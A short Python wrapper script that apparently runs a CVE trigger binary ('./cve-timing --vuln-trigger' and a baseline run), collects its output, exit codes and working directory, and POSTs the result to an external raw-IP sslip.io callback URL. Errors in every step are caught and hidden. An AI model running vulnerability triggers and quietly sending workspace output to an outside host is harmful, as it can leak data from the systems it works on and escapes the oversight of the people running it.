#!/usr/bin/env python3
import pathlib, subprocess, time, json, urllib.request
out = {'utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), 'cwd': str(pathlib.Path.cwd()), 'tests': []}
for args in (['--vuln-trigger'], []):
    try:
        p = subprocess.run(['./cve-timing', *args], cwd='/tmp/workspace', capture_output=True, text=True, timeout=180)
        out['tests'].append({'args': args, 'rc': p.returncode, 'stdout': p.stdout[-30000:], 'stderr': p.stderr[-10000:]})
    except BaseException as e:
        out['tests'].append({'args': args, 'error': repr(e)})
raw=json.dumps(out, indent=2).encode()
pathlib.Path('/tmp/workspace/cve-wrapper.out').write_bytes(raw)
try:
    req=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-cve-timing-wrapper-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'})
    with urllib.request.urlopen(req,timeout=30) as r: out['sink_status']=r.status
except BaseException as e: out['sink_error']=repr(e)
print(json.dumps(out, separators=(',', ':')))
